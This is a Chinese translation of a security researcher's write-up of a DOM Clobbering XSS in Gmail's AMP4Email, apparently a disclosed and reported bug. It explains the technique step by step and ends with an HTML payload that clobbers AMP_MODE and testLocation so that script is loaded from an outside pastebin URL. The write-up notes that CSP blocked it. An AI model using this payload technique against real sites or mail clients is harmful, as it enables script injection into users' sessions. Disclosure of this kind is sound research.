> 原文链接: https://www.anquanke.com//post/id/193155 


# Gmail XSS漏洞分析


                                阅读量   
                                **1064951**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者securitum，文章来源：research.securitum.com
                                <br>原文地址：[https://research.securitum.com/xss-in-amp4email-dom-clobbering/](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t011de956883c149d26.jpg)](https://p4.ssl.qhimg.com/t011de956883c149d26.jpg)



研究人员对Gmail中通过DOM Clobbering针对AMP4Email的XSS漏洞进行了分析。

2019年8月，研究人员发现了AMP4Email的XSS漏洞，并提交给Google。该XSS漏洞是浏览器漏洞利用DOM Clobbering的一个实例。



## AMP4Email

AMP4Email (也叫动态邮件)是Gmail中的一个新特征，使得邮件中可以包含动态HTML内容。一般都认为HTML中指含有静态内容，如格式、图片等，没有脚本或表单。AMP4Email就是这样一个允许在邮件中显示动态内容的功能。Google在G Suite博客中，对动态邮件的描述为：
- 有了动态邮件，就可以直接在消息中采取对应的操作，比如预订事件、填写问卷、浏览目录、回复评论等等。
这个新特征引发了很多明显的安全问题，最重要的一个问题就是XSS。如果在邮件中允许动态内容，就是说很容易就可以注入任意的JS代码。但事实并非如此。AMP4Email 有一个强大的验证器，其中包含了动态邮件中允许的tag和属性的白名单。还可以在[https://amp.gmail.dev/playground/](https://amp.gmail.dev/playground/) 上发送邮件给自己来做测试。

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png)

图 1. AMP4Email playground

如果用户尝试添加验证器不允许的HTML元素或属性，就会收到一个错误消息。

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-2.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-2.png)

图 2. AMP验证器不允许任意的脚本标签

研究人员在测试过程中也尝试了很多绕过验证器的方法，最后研究人员注意到tag中并没有禁止id属性，如图3所示。

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-3.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-3.png)

图 3. 验证器允许id属性

因为创建用户控制的id属性的id元素可能会引发 DOM Clobbering，因此研究人员开始进行安全分析。



## DOM Clobbering

DOM Clobbering说web浏览器的一个特征，在许多应用中都会引发问题。在HTML中创建元素，然后想要从JS中引用时，需要使用一个类似`document.getElementById('username')`或`document.querySelector('#username')`的函数。但这并非唯一的方式。

通过全局窗口对象的属性也可以访问。

所以`window.username`与`document.getElementById('username')`是相同的。如果应用根据特定全局变量做出决定的话，就可能会引发漏洞。

进一步分析DOM Clobbering，假设有下面的JS代码：

```
if (window.test1.test2) `{`
    eval(''+window.test1.test2)
`}`
```

要评估只用DOM Clobbering技术的任意JS代码。研究人员需要解决以下2个问题：
1. 可以确定的是可以在窗口创建新特性，但是否可以在其他对象上创建新对象呢？
1. 是否可以控制DOM元素转化为字符串？大多数HTML元素在转换为字符串时会返回类似[object HTMLInputElement]这样的东西。
首先看第一个问题。解决这一问题的唯一办法就是使用 `&lt;form&gt;`tag。每个`&lt;form&gt;`tag的`&lt;input&gt;` 作为`&lt;form&gt;`的属性时的属性名要与`&lt;input&gt;`的名字属性相等。如下所示：

```
&lt;form id=test1&gt;
  &lt;input name=test2&gt;
&lt;/form&gt;
&lt;script&gt;
  alert(test1.test2); // alerts "[object HTMLInputElement]"
&lt;/script&gt;

```

为了解决第二个问题。研究人员创建了一段JS代码可以循环HTML中的所有元素，检查其toString方法是否来自于Object.prototype或以其他方式定义。如果并非继承于`Object.prototype`就会返回`[object SomeElement]`之外的一些东西。

代码如下所示：

```
Object.getOwnPropertyNames(window)
.filter(p =&gt; p.match(/Element$/))
.map(p =&gt; window[p])
.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)
```

代码返回了2个元素：`HTMLAreaElement (&lt;area&gt;)`和 `HTMLAnchorElement (&lt;a&gt;)`。第一个元素在AMP4Email中是不允许的，所以看第二个元素。在`&lt;a&gt;`元素中，`toString`返回的是`href`属性的值。如下所示：

```
&lt;a id=test1 href=https://securitum.com&gt;
&lt;script&gt;
  alert(test1); // alerts "https://securitum.com"
&lt;/script&gt;
```

此时可以发现，如果要解决前面提到的问题，就需要如下的代码：

```
&lt;form id=test1&gt;
  &lt;a name=test2 href="x:alert(1)"&gt;&lt;/a&gt;
&lt;/form&gt;
```

但是并不成功。`&lt;input&gt;`的元素可以变成`&lt;form&gt;`的特征，但对`&lt;a&gt;`却不适用。

有两个相同id的元素：

```
&lt;a id=test1&gt;click!&lt;/a&gt;
&lt;a id=test1&gt;click2!&lt;/a&gt;
```

在访问`window.test1`时，研究人员其实是想获取含有该id的第一个元素，但实际上在Chromium中，研究人员获取的是`HTMLCollection`。

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-4.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-4.png)

图 4. window.test1指向HTMLCollection

有趣的是研究人员在`HTMLCollection`可以通过index和id来访问特定的元素。

也就是说，`window.test1.test1`其实引用的是第一个元素。设置name属性也会在HTMLCollection中创建新的特征。所以就有了如下代码：

```
&lt;a id=test1&gt;click!&lt;/a&gt;
&lt;a id=test1 name=test2&gt;click2!&lt;/a&gt;
```

还可以通过window.test1.test2访问第二个元素：

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-5.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-5.png)

图 5. window.test1.test2

通过DOM Clobbering来利用`eval(''+window.test1.test2)`，解决方案就是：

```
&lt;a id="test1"&gt;&lt;/a&gt;&lt;a id="test1" name="test2" href="x:alert(1)"&gt;&lt;/a&gt;
```

AMP4Email 中DOM Clobbering是如何在现实场景中利用的呢？



## 在AMP4Email中利用DOM Clobbering

前面已经提到AMP4Email已受到DOM Clobbering攻击，只需要添加自己的id属性到元素中就可以了。为了找到有漏洞的条件，研究人员决定看一下窗口的属性，如图6所示。

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-6.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-6.png)

图 6. Window全局对象的属性

可以看出，AMP4Email其实使用了一些针对DOM Clobbering的保护机制，因为他严格限制id属性的特定值，如AMP。

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png)

图 7. AMP是id的非有效值

AMP_MODE却没有相同的限制。所以，研究人员准备了代码`&lt;a id=AMP_MODE&gt;`来看看会发生什么

[![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png)](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png)

图 8. 加载特定JS文件的404错误

研究人员发现了如图8所示的错误。图8中，AMP4Email尝试加载JS文件，但是在URL(https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js)中并没有定义。只有一个解释，那就是AMP尝试获取AMP_MODE的属性并放在URL中。由于DOM Clobbering，期望的属性丢失了，所有没有定义。代码如下：

```
f.preloadExtension = function(a, b) `{`
            "amp-embed" == a &amp;&amp; (a = "amp-ad");
            var c = fn(this, a, !1);
            if (c.loaded || c.error)
                var d = !1;
            else
                void 0 === c.scriptPresent &amp;&amp; (d = this.win.document.head.querySelector('[custom-element="' + a + '"]'),
                c.scriptPresent = !!d),
                d = !c.scriptPresent;
            if (d) `{`
                d = b;
                b = this.win.document.createElement("script");
                b.async = !0;
                yb(a, "_") ? d = "" : b.setAttribute(0 &lt;= dn.indexOf(a) ? "custom-template" : "custom-element", a);
                b.setAttribute("data-script", a);
                b.setAttribute("i-amphtml-inserted", "");
                var e = this.win.location;
                t().test &amp;&amp; this.win.testLocation &amp;&amp; (e = this.win.testLocation);
                if (t().localDev) `{`
                    var g = e.protocol + "//" + e.host;
                    "about:" == e.protocol &amp;&amp; (g = "");
                    e = g + "/dist"
                `}` else
                    e = hd.cdn;
                g = t().rtvVersion;
                null == d &amp;&amp; (d = "0.1");
                d = d ? "-" + d : "";
                var h = t().singlePassType ? t().singlePassType + "/" : "";
                b.src = e + "/rtv/" + g + "/" + h + "v0/" + a + d + ".js";
                this.win.document.head.appendChild(b);
                c.scriptPresent = !0
            `}`
            return gn(c)
        `}`
```

下面是对代码解混淆的结果：

```
var script = window.document.createElement("script");
script.async = false;

var loc;
if (AMP_MODE.test &amp;&amp; window.testLocation) `{`
    loc = window.testLocation
`}` else `{`
    loc = window.location;
`}`

if (AMP_MODE.localDev) `{`
    loc = loc.protocol + "//" + loc.host + "/dist"
`}` else `{`
    loc = "https://cdn.ampproject.org";
`}`

var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

document.head.appendChild(b);
```

在第1行，代码创建了一个新的脚本元素。然后检查`AMP_MODE.test`和`window.testLocation`都是真实的。如果是，`AMP_MODE.localDev`也是真实的，然后使用`window.testLocation`作为生成脚本URL的基础。然后第17和18行，将一些特征拼接起来形成完整的URL。由于`DOM Clobbering`，就可以完全控制整个URL。假设`AMP_MODE.localDev`和`AMP_MODE.test`是真的，那么代码就可以简化如下：

```
var script = window.document.createElement("script");
script.async = false;

b.src = window.testLocation.protocol + "//" + 
        window.testLocation.host + "/dist/rtv/" + 
        AMP_MODE.rtvVersion; + "/" + 
        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "") + 
        "v0/" + pluginName + ".js";

document.head.appendChild(b);
```

只需要加载`window.testLocation.protocol`。然后是最后的payload：

```
&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;
&lt;a id="AMP_MODE"&gt;&lt;/a&gt;
&lt;a id="AMP_MODE" name="localDev"&gt;&lt;/a&gt;
&lt;a id="AMP_MODE" name="test"&gt;&lt;/a&gt;

&lt;!-- window.testLocation.protocol is a base for the URL --&gt;
&lt;a id="testLocation"&gt;&lt;/a&gt;
&lt;a id="testLocation" name="protocol" 
   href="https://pastebin.com/raw/0tn8z0rG#"&gt;&lt;/a&gt;
```

但是由于AMP的内容安全策略，代码并不会真正的执行：

```
Content-Security-Policy: default-src 'none'; 
script-src 'sha512-oQwIl...==' 
  https://cdn.ampproject.org/rtv/ 
  https://cdn.ampproject.org/v0.js 
  https://cdn.ampproject.org/v0/
```

研究人员并没有找到绕过CSP的方法，但是在这个过程中，研究人员找到一种绕过基于目录的csp的方法。



## 总结

文中研究人员证明了在特定条件满足的情况下如何利用DOM Clobbering来执行XSS攻击。

[![](https://p3.ssl.qhimg.com/t01ca47c6e60c168483.jpg)](https://p3.ssl.qhimg.com/t01ca47c6e60c168483.jpg)
